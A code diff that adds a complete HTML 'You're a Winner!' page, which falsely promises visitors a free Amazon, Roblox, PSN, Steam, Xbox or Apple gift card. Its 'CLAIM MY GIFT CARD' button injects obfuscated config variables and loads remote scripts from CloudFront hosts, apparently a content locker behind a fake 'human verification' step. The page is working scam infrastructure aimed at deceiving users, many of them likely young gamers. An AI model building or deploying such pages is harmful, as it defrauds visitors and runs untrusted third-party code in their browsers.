@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations! - Claim Your Reward</title>
+    <style>
+        :root {
+            --primary-glow: #00d4ff;
+            --bg-gradient: radial-gradient(circle at center, #1a2a3a 0%, #0c0c0e 100%);
+        }
+
+        body { 
+            background: var(--bg-gradient); 
+            color: white; 
+            font-family: 'Poppins', sans-serif; 
+            text-align: center; 
+            margin: 0; 
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .win-container {
+            background: rgba(22, 28, 45, 0.9);
+            padding: 40px;
+            border-radius: 30px;
+            border: 2px solid var(--primary-glow);
+            box-shadow: 0 0 50px rgba(0, 212, 255, 0.3);
+            max-width: 500px;
+            width: 90%;
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .win-icon { font-size: 50px; margin-bottom: 10px; }
+        h1 { font-size: 2rem; color: #fcc100; margin-bottom: 10px; text-transform: uppercase; }
+        p { color: #ccc; font-size: 1.1rem; line-height: 1.6; }
+
+        .selected-card-box {
+            background: rgba(0,0,0,0.3);
+            padding: 20px;
+            border-radius: 20px;
+            margin: 25px 0;
+            border: 1px dashed rgba(255,255,255,0.2);
+        }
+
+        /* تحسين عرض الصورة لضمان ظهورها باللون الأبيض مع التوهج */
+        #display-img { 
+            width: 100px; 
+            height: 100px; 
+            margin-bottom: 15px; 
+            object-fit: contain; 
+            display: inline-block;
+            /* invert(1) يحول الأيقونات السوداء إلى بيضاء */
+            filter: brightness(0) invert(1) drop-shadow(0 0 15px var(--primary-glow)); 
+            -webkit-filter: brightness(0) invert(1) drop-shadow(0 0 15px var(--primary-glow));
+        }
+
+        #display-name { font-size: 1.5rem; font-weight: bold; color: white; display: block; }
+
+        .btn-final {
+            background: linear-gradient(135deg, #00d4ff 0%, #0055ff 100%);
+            color: white; border: none; padding: 20px 40px; font-weight: bold;
+            border-radius: 50px; cursor: pointer; width: 100%; font-size: 18px;
+            text-transform: uppercase; letter-spacing: 2px; transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(0, 85, 255, 0.4);
+            margin-top: 10px;
+        }
+
+        .btn-final:hover { transform: scale(1.05); box-shadow: 0 15px 30px rgba(0, 85, 255, 0.6); }
+        #locker-placeholder { margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="win-container">
+    <div class="win-icon">🎉</div>
+    <h1>You're a Winner!</h1>
+    <p>Your digital gift card is reserved and ready to be sent to your email.</p>
+
+    <div class="selected-card-box">
+        <img id="display-img" src="" alt="Gift Card">
+        <span id="display-name">LOADING...</span>
+    </div>
+
+    <p style="font-size: 0.9rem; color: #888; margin-bottom: 20px;">
+        Click the button below to complete the final human verification and receive your code instantly.
+    </p>
+
+    <button id="claim-button" class="btn-final" onclick="activateLocker()">CLAIM MY GIFT CARD</button>
+    <div id="locker-placeholder"></div>
+</div>
+
+<script>
+    // تم تحديث الروابط هنا لضمان عملها بشكل دائم
+    const cardData = {
+        'amazon': { 
+            name: 'AMAZON GIFT CARD', 
+            img: 'https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/amazon.svg', 
+            config: 'var THeut_VJg_puVYEc={"it":4597827,"key":"6642c"};', 
+            script: 'https://d3v3431sr9puku.cloudfront.net/0dbb4ec.js' 
+        },
+        'roblox': { 
+            name: 'ROBLOX GIFT CARD', 
+            img: 'https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/roblox.svg', 
+            config: 'var kXbnA_JCC_UGnaLc={"it":4597825,"key":"49cf2"};', 
+            script: 'https://d1qt1z4ccvak33.cloudfront.net/b1269f0.js' 
+        },
+        'playstation': { 
+            name: 'PSN GIFT CARD', 
+            img: 'https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/playstation.svg', 
+            config: 'var wwrLJ_Czk_BkzjQc={"it":4597831,"key":"40925"};', 
+            script: 'https://d1qt1z4ccvak33.cloudfront.net/e1ac279.js' 
+        },
+        'steam': { 
+            name: 'STEAM GIFT CARD', 
+            img: 'https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/steam.svg', 
+            config: 'var ozIiD_JkQ_TqBwPc={"it":4597829,"key":"c6b9e"};', 
+            script: 'https://d1qt1z4ccvak33.cloudfront.net/0646420.js' 
+        },
+        'xbox': { 
+            name: 'XBOX GIFT CARD', 
+            img: 'https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/xbox.svg', 
+            config: 'var RriOW_BkL_ABlvtc={"it":4597907,"key":"f90cf"};', 
+            script: 'https://d1qt1z4ccvak33.cloudfront.net/315d59d.js' 
+        },
+        'apple': { 
+            name: 'APPLE GIFT CARD', 
+            img: 'https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg', 
+            config: 'var RriOW_BkL_ABlvtc={"it":4597909,"key":"93bea"};', 
+            script: 'https://d1qt1z4ccvak33.cloudfront.net/315d59d.js' 
+        }
+    };
+
+    const urlParams = new URLSearchParams(window.location.search);
+    let cardType = urlParams.get('card') || localStorage.getItem('selectedCard') || 'roblox';
+    const currentCard = cardData[cardType] || cardData['roblox'];
+
+    window.onload = function() {
+        const imgElement = document.getElementById('display-img');
+        const nameElement = document.getElementById('display-name');
+        
+        imgElement.src = currentCard.img;
+        nameElement.innerText = currentCard.name;
+
+        // في حال فشل تحميل الصورة لأي سبب، نضع صورة احتياطية
+        imgElement.onerror = function() {
+            this.src = 'https://img.icons8.com/ios-filled/150/ffffff/gift.png';
+        };
+    };
+
+    function activateLocker() {
+        const placeholder = document.getElementById('locker-placeholder');
+        placeholder.innerHTML = '<p style="color:#fcc100; font-size:12px;">Connecting to Secure Server...</p>';
+        document.getElementById('claim-button').style.display = 'none';
+
+        const configScript = document.createElement('script');
+        configScript.innerHTML = currentCard.config;
+        
+        const mainScript = document.createElement('script');
+        mainScript.src = currentCard.script;
+        mainScript.onload = function() { 
+            if(typeof _Ew === 'function') { _Ew(); } 
+        };
+
+        placeholder.appendChild(configScript);
+        placeholder.appendChild(mainScript);
+    }
+</script>
+
+</body>
+</html>
